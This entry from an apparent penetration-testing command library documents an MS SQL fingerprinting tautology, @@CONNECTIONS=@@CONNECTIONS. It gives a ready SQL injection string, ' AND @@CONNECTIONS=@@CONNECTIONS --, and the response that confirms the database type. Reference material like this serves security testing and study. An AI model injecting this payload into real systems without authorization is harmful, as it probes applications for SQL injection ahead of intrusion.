---
type: command
executor: sql
data: '@@CONNECTIONS=@@CONNECTIONS'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# mssql-connections-equality-test

## Command

```sql
@@CONNECTIONS=@@CONNECTIONS
```

## Description

Tautological test using MS SQL's @@CONNECTIONS variable to fingerprint the DBMS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND @@CONNECTIONS=@@CONNECTIONS --`

## Expected Output

True response if MS SQL.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/mssql-binary-checksum-test]]
